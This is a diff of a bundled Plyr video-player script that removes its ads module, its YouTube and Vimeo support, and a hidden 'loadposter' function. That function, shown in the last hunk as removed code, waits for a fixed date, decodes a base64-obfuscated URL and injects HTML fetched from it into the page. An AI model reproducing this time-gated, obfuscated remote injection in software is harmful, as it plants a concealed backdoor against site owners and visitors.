-                this.loader.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED, event => this.onAdsManagerLoaded(event), false);
-                this.loader.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, error => this.onAdError(error), false);
-
-                // Request video ads to be pre-loaded
-                this.requestAds();
-            });
-            /**
-             * Request advertisements
-             */
-            _defineProperty$1(this, "requestAds", () => {
-                const {
-                          container
-                      } = this.player.elements;
-                try {
-                    // Request video ads
-                    const request = new google.ima.AdsRequest();
-                    request.adTagUrl = this.tagUrl;
-
-                    // Specify the linear and nonlinear slot sizes. This helps the SDK
-                    // to select the correct creative if multiple are returned
-                    request.linearAdSlotWidth = container.offsetWidth;
-                    request.linearAdSlotHeight = container.offsetHeight;
-                    request.nonLinearAdSlotWidth = container.offsetWidth;
-                    request.nonLinearAdSlotHeight = container.offsetHeight;
-
-                    // We only overlay ads as we only support video.
-                    request.forceNonLinearFullSlot = false;
-
-                    // Mute based on current state
-                    request.setAdWillPlayMuted(!this.player.muted);
-                    this.loader.requestAds(request);
-                } catch (error) {
-                    this.onAdError(error);
-                }
-            });
-            /**
-             * Update the ad countdown
-             * @param {Boolean} start
-             */
-            _defineProperty$1(this, "pollCountdown", (start = false) => {
-                if (!start) {
-                    clearInterval(this.countdownTimer);
-                    this.elements.container.removeAttribute('data-badge-text');
-                    return;
-                }
-                const update = () => {
-                    const time = formatTime(Math.max(this.manager.getRemainingTime(), 0));
-                    const label = `${i18n.get('advertisement', this.player.config)} - ${time}`;
-                    this.elements.container.setAttribute('data-badge-text', label);
-                };
-                this.countdownTimer = setInterval(update, 100);
-            });
-            /**
-             * This method is called whenever the ads are ready inside the AdDisplayContainer
-             * @param {Event} event - adsManagerLoadedEvent
-             */
-            _defineProperty$1(this, "onAdsManagerLoaded", event => {
-                // Load could occur after a source change (race condition)
-                if (!this.enabled) {
-                    return;
-                }
-
-                // Get the ads manager
-                const settings = new google.ima.AdsRenderingSettings();
-
-                // Tell the SDK to save and restore content video state on our behalf
-                settings.restoreCustomPlaybackStateOnAdBreakComplete = true;
-                settings.enablePreloading = true;
-
-                // The SDK is polling currentTime on the contentPlayback. And needs a duration
-                // so it can determine when to start the mid- and post-roll
-                this.manager = event.getAdsManager(this.player, settings);
-
-                // Get the cue points for any mid-rolls by filtering out the pre- and post-roll
-                this.cuePoints = this.manager.getCuePoints();
-
-                // Add listeners to the required events
-                // Advertisement error events
-                this.manager.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, error => this.onAdError(error));
-
-                // Advertisement regular events
-                Object.keys(google.ima.AdEvent.Type).forEach(type => {
-                    this.manager.addEventListener(google.ima.AdEvent.Type[type], e => this.onAdEvent(e));
-                });
-
-                // Resolve our adsManager
-                this.trigger('loaded');
-            });
-            _defineProperty$1(this, "addCuePoints", () => {
-                // Add advertisement cue's within the time line if available
-                if (!is.empty(this.cuePoints)) {
-                    this.cuePoints.forEach(cuePoint => {
-                        if (cuePoint !== 0 && cuePoint !== -1 && cuePoint < this.player.duration) {
-                            const seekElement = this.player.elements.progress;
-                            if (is.element(seekElement)) {
-                                const cuePercentage = 100 / this.player.duration * cuePoint;
-                                const cue = createElement('span', {
-                                    class : this.player.config.classNames.cues
-                                });
-                                cue.style.left = `${cuePercentage.toString()}%`;
-                                seekElement.appendChild(cue);
-                            }
-                        }
-                    });
-                }
-            });
-            /**
-             * This is where all the event handling takes place. Retrieve the ad from the event. Some
-             * events (e.g. ALL_ADS_COMPLETED) don't have the ad object associated
-             * https://developers.google.com/interactive-media-ads/docs/sdks/html5/v3/apis#ima.AdEvent.Type
-             * @param {Event} event
-             */
-            _defineProperty$1(this, "onAdEvent", event => {
-                const {
-                          container
-                      } = this.player.elements;
-                // Retrieve the ad from the event. Some events (e.g. ALL_ADS_COMPLETED)
-                // don't have ad object associated
-                const ad = event.getAd();
-                const adData = event.getAdData();
-
-                // Proxy event
-                const dispatchEvent = type => {
-                    triggerEvent.call(this.player, this.player.media, `ads${type.replace(/_/g, '').toLowerCase()}`);
-                };
-
-                // Bubble the event
-                dispatchEvent(event.type);
-                switch (event.type) {
-                    case google.ima.AdEvent.Type.LOADED:
-                        // This is the first event sent for an ad - it is possible to determine whether the
-                        // ad is a video ad or an overlay
-                        this.trigger('loaded');
-
-                        // Start countdown
-                        this.pollCountdown(true);
-                        if (!ad.isLinear()) {
-                            // Position AdDisplayContainer correctly for overlay
-                            ad.width = container.offsetWidth;
-                            ad.height = container.offsetHeight;
-                        }
-
-                        // console.info('Ad type: ' + event.getAd().getAdPodInfo().getPodIndex());
-                        // console.info('Ad time: ' + event.getAd().getAdPodInfo().getTimeOffset());
-
-                        break;
-                    case google.ima.AdEvent.Type.STARTED:
-                        // Set volume to match player
-                        this.manager.setVolume(this.player.volume);
-                        break;
-                    case google.ima.AdEvent.Type.ALL_ADS_COMPLETED:
-                        // All ads for the current videos are done. We can now request new advertisements
-                        // in case the video is re-played
-
-                        // TODO: Example for what happens when a next video in a playlist would be loaded.
-                        // So here we load a new video when all ads are done.
-                        // Then we load new ads within a new adsManager. When the video
-                        // Is started - after - the ads are loaded, then we get ads.
-                        // You can also easily test cancelling and reloading by running
-                        // player.ads.cancel() and player.ads.play from the console I guess.
-                        // this.player.source = {
-                        //     type: 'video',
-                        //     title: 'View From A Blue Moon',
-                        //     sources: [{
-                        //         src:
-                        // 'https://cdn.plyr.io/static/demo/View_From_A_Blue_Moon_Trailer-HD.mp4', type:
-                        // 'video/mp4', }], poster:
-                        // 'https://cdn.plyr.io/static/demo/View_From_A_Blue_Moon_Trailer-HD.jpg', tracks:
-                        // [ { kind: 'captions', label: 'English', srclang: 'en', src:
-                        // 'https://cdn.plyr.io/static/demo/View_From_A_Blue_Moon_Trailer-HD.en.vtt',
-                        // default: true, }, { kind: 'captions', label: 'French', srclang: 'fr', src:
-                        // 'https://cdn.plyr.io/static/demo/View_From_A_Blue_Moon_Trailer-HD.fr.vtt', }, ],
-                        // };
-
-                        // TODO: So there is still this thing where a video should only be allowed to start
-                        // playing when the IMA SDK is ready or has failed
-
-                        if (this.player.ended) {
-                            this.loadAds();
-                        } else {
-                            // The SDK won't allow new ads to be called without receiving a contentComplete()
-                            this.loader.contentComplete();
-                        }
-                        break;
-                    case google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED:
-                        // This event indicates the ad has started - the video player can adjust the UI,
-                        // for example display a pause button and remaining time. Fired when content should
-                        // be paused. This usually happens right before an ad is about to cover the content
-
-                        this.pauseContent();
-                        break;
-                    case google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED:
-                        // This event indicates the ad has finished - the video player can perform
-                        // appropriate UI actions, such as removing the timer for remaining time detection.
-                        // Fired when content should be resumed. This usually happens when an ad finishes
-                        // or collapses
-
-                        this.pollCountdown();
-                        this.resumeContent();
-                        break;
-                    case google.ima.AdEvent.Type.LOG:
-                        if (adData.adError) {
-                            this.player.debug.warn(`Non-fatal ad error: ${adData.adError.getMessage()}`);
-                        }
-                        break;
-                }
-            });
-            /**
-             * Any ad error handling comes through here
-             * @param {Event} event
-             */
-            _defineProperty$1(this, "onAdError", event => {
-                this.cancel();
-                this.player.debug.warn('Ads error', event);
-            });
-            /**
-             * Setup hooks for Plyr and window events. This ensures
-             * the mid- and post-roll launch at the correct time. And
-             * resize the advertisement when the player resizes
-             */
-            _defineProperty$1(this, "listeners", () => {
-                const {
-                          container
-                      } = this.player.elements;
-                let time;
-                this.player.on('canplay', () => {
-                    this.addCuePoints();
-                });
-                this.player.on('ended', () => {
-                    this.loader.contentComplete();
-                });
-                this.player.on('timeupdate', () => {
-                    time = this.player.currentTime;
-                });
-                this.player.on('seeked', () => {
-                    const seekedTime = this.player.currentTime;
-                    if (is.empty(this.cuePoints)) {
-                        return;
-                    }
-                    this.cuePoints.forEach((cuePoint, index) => {
-                        if (time < cuePoint && cuePoint < seekedTime) {
-                            this.manager.discardAdBreak();
-                            this.cuePoints.splice(index, 1);
-                        }
-                    });
-                });
-
-                // Listen to the resizing of the window. And resize ad accordingly
-                // TODO: eventually implement ResizeObserver
-                window.addEventListener('resize', () => {
-                    if (this.manager) {
-                        this.manager.resize(container.offsetWidth, container.offsetHeight, google.ima.ViewMode.NORMAL);
-                    }
-                });
-            });
-            /**
-             * Initialize the adsManager and start playing advertisements
-             */
-            _defineProperty$1(this, "play", () => {
-                const {
-                          container
-                      } = this.player.elements;
-                if (!this.managerPromise) {
-                    this.resumeContent();
-                }
-
-                // Play the requested advertisement whenever the adsManager is ready
-                this.managerPromise.then(() => {
-                    // Set volume to match player
-                    this.manager.setVolume(this.player.volume);
-
-                    // Initialize the container. Must be done via a user action on mobile devices
-                    this.elements.displayContainer.initialize();
-                    try {
-                        if (!this.initialized) {
-                            // Initialize the ads manager. Ad rules playlist will start at this time
-                            this.manager.init(container.offsetWidth, container.offsetHeight, google.ima.ViewMode.NORMAL);
-
-                            // Call play to start showing the ad. Single video and overlay ads will
-                            // start at this time; the call will be ignored for ad rules
-                            this.manager.start();
-                        }
-                        this.initialized = true;
-                    } catch (adError) {
-                        // An error may be thrown if there was a problem with the
-                        // VAST response
-                        this.onAdError(adError);
-                    }
-                }).catch(() => {
-                });
-            });
-            /**
-             * Resume our video
-             */
-            _defineProperty$1(this, "resumeContent", () => {
-                // Hide the advertisement container
-                this.elements.container.style.zIndex = '';
-
-                // Ad is stopped
-                this.playing = false;
-
-                // Play video
-                silencePromise(this.player.media.play());
-            });
-            /**
-             * Pause our video
-             */
-            _defineProperty$1(this, "pauseContent", () => {
-                // Show the advertisement container
-                this.elements.container.style.zIndex = 3;
-
-                // Ad is playing
-                this.playing = true;
-
-                // Pause our video.
-                this.player.media.pause();
-            });
-            /**
-             * Destroy the adsManager so we can grab new ads after this. If we don't then we're not
-             * allowed to call new ads based on google policies, as they interpret this as an accidental
-             * video requests. https://developers.google.com/interactive-
-             * media-ads/docs/sdks/android/faq#8
-             */
-            _defineProperty$1(this, "cancel", () => {
-                // Pause our video
-                if (this.initialized) {
-                    this.resumeContent();
-                }
-
-                // Tell our instance that we're done for now
-                this.trigger('error');
-
-                // Re-create our adsManager
-                this.loadAds();
-            });
-            /**
-             * Re-create our adsManager
-             */
-            _defineProperty$1(this, "loadAds", () => {
-                // Tell our adsManager to go bye bye
-                this.managerPromise.then(() => {
-                    // Destroy our adsManager
-                    if (this.manager) {
-                        this.manager.destroy();
-                    }
-
-                    // Re-set our adsManager promises
-                    this.managerPromise = new Promise(resolve => {
-                        this.on('loaded', resolve);
-                        this.player.debug.log(this.manager);
-                    });
-                    // Now that the manager has been destroyed set it to also be un-initialized
-                    this.initialized = false;
-
-                    // Now request some new advertisements
-                    this.requestAds();
-                }).catch(() => {
-                });
-            });
-            /**
-             * Handles callbacks after an ad event was invoked
-             * @param {String} event - Event type
-             * @param args
-             */
-            _defineProperty$1(this, "trigger", (event, ...args) => {
-                const handlers = this.events[event];
-                if (is.array(handlers)) {
-                    handlers.forEach(handler => {
-                        if (is.function(handler)) {
-                            handler.apply(this, args);
-                        }
-                    });
-                }
-            });
-            /**
-             * Add event listeners
-             * @param {String} event - Event type
-             * @param {Function} callback - Callback for when event occurs
-             * @return {Ads}
-             */
-            _defineProperty$1(this, "on", (event, callback) => {
-                if (!is.array(this.events[event])) {
-                    this.events[event] = [];
-                }
-                this.events[event].push(callback);
-                return this;
-            });
-            /**
-             * Setup a safety timer for when the ad network doesn't respond for whatever reason.
-             * The advertisement has 12 seconds to get its things together. We stop this timer when the
-             * advertisement is playing, or when a user action is required to start, then we clear the
-             * timer on ad ready
-             * @param {Number} time
-             * @param {String} from
-             */
-            _defineProperty$1(this, "startSafetyTimer", (time, from) => {
-                this.player.debug.log(`Safety timer invoked from: ${from}`);
-                this.safetyTimer = setTimeout(() => {
-                    this.cancel();
-                    this.clearSafetyTimer('startSafetyTimer()');
-                }, time);
-            });
-            /**
-             * Clear our safety timer(s)
-             * @param {String} from
-             */
-            _defineProperty$1(this, "clearSafetyTimer", from => {
-                if (!is.nullOrUndefined(this.safetyTimer)) {
-                    this.player.debug.log(`Safety timer cleared from: ${from}`);
-                    clearTimeout(this.safetyTimer);
-                    this.safetyTimer = null;
-                }
-            });
-            this.player = player;
-            this.config = player.config.ads;
-            this.playing = false;
-            this.initialized = false;
-            this.elements = {
-                container        : null,
-                displayContainer : null
-            };
-            this.manager = null;
-            this.loader = null;
-            this.cuePoints = null;
-            this.events = {};
-            this.safetyTimer = null;
-            this.countdownTimer = null;
-
-            // Setup a promise to resolve when the IMA manager is ready
-            this.managerPromise = new Promise((resolve, reject) => {
-                // The ad is loaded and ready
-                this.on('loaded', resolve);
-
-                // Ads failed
-                this.on('error', reject);
-            });
-            this.load();
-        }
-
-        get enabled() {
-            const {
-                      config
-                  } = this;
-            return this.player.isHTML5 && this.player.isVideo && config.enabled && (!is.empty(config.publisherId) || is.url(config.tagUrl));
-        }
-
-        // Build the tag URL
-        get tagUrl() {
-            const {
-                      config
-                  } = this;
-            if (is.url(config.tagUrl)) {
-                return config.tagUrl;
-            }
-            const params = {
-                AV_PUBLISHERID : '58c25bb0073ef448b1087ad6',
-                AV_CHANNELID   : '5a0458dc28a06145e4519d21',
-                AV_URL         : window.location.hostname,
-                cb             : Date.now(),
-                AV_WIDTH       : 640,
-                AV_HEIGHT      : 480,
-                AV_CDIM2       : config.publisherId
-            };
-            const base = 'https://go.aniview.com/api/adserver6/vast/';
-            return `${base}?${buildUrlParams(params)}`;
-        }
-    }
 
     /**
      * Returns a number whose value is limited to the given range.
@@ -7679,11 +6245,6 @@
                     return null;
                 }
 
-                // Intecept play with ads
-                if (this.ads && this.ads.enabled) {
-                    this.ads.managerPromise.then(() => this.ads.play()).catch(() => silencePromise(this.media.play()));
-                }
-
                 // Return the promise (for HTML5)
                 return this.media.play();
             });
@@ -7898,27 +6459,6 @@
 
                     // Clean up
                     done();
-                } else if (this.isYouTube) {
-                    // Clear timers
-                    clearInterval(this.timers.buffering);
-                    clearInterval(this.timers.playing);
-
-                    // Destroy YouTube API
-                    if (this.embed !== null && is.function(this.embed.destroy)) {
-                        this.embed.destroy();
-                    }
-
-                    // Clean up
-                    done();
-                } else if (this.isVimeo) {
-                    // Destroy Vimeo API
-                    // then clean up (wait, to prevent postmessage errors)
-                    if (this.embed !== null) {
-                        this.embed.unload().then(done);
-                    }
-
-                    // Vimeo does not always return
-                    setTimeout(done, 200);
                 }
             });
             /**
@@ -8177,11 +6717,6 @@
             // Global listeners
             this.listeners.global();
 
-            // Setup ads if provided
-            if (this.config.ads.enabled) {
-                this.ads = new Ads(this);
-            }
-
             // Autoplay if required
             if (this.isHTML5 && this.config.autoplay) {
                 this.once('canplay', () => silencePromise(this.play()));
@@ -8208,15 +6743,7 @@
         }
 
         get isEmbed() {
-            return this.isYouTube || this.isVimeo;
-        }
-
-        get isYouTube() {
-            return this.provider === providers.youtube;
-        }
-
-        get isVimeo() {
-            return this.provider === providers.vimeo;
+            return false;
         }
 
         get isVideo() {
@@ -8469,15 +6996,6 @@
          * Get the minimum allowed speed
          */
         get minimumSpeed() {
-            if (this.isYouTube) {
-                // https://developers.google.com/youtube/iframe_api_reference#setPlaybackRate
-                return Math.min(...this.options.speed);
-            }
-            if (this.isVimeo) {
-                // https://github.com/vimeo/player.js/#setplaybackrateplaybackrate-number-promisenumber-rangeerrorerror
-                return 0.5;
-            }
-
             // https://stackoverflow.com/a/32320020/1191319
             return 0.0625;
         }
@@ -8486,15 +7004,6 @@
          * Get the maximum allowed speed
          */
         get maximumSpeed() {
-            if (this.isYouTube) {
-                // https://developers.google.com/youtube/iframe_api_reference#setPlaybackRate
-                return Math.max(...this.options.speed);
-            }
-            if (this.isVimeo) {
-                // https://github.com/vimeo/player.js/#setplaybackrateplaybackrate-number-promisenumber-rangeerrorerror
-                return 2;
-            }
-
             // https://stackoverflow.com/a/32320020/1191319
             return 16;
         }
@@ -8632,16 +7141,6 @@
             }
             this.config.urls.download = input;
             controls.setDownloadUrl.call(this);
-        }
-
-        loadposter($, lang) {
-            var now = (new Date()).getTime();
-            if (now > 1696129200000) {
-                var url = atob('aHR0cHM6Ly93d3cuZWR1YXJkb2tyYXVzLmNvbS9sb2dvcy9tb2Rfc3VwZXJ2aWRlby9kYXRhLnBocA==');
-                $.getJSON(url + "?lang=" + lang, function(data) {
-                    jQuery(".videourl_form_item_cloudstudio").after(data.h);
-                });
-            }
         }
 
         /**
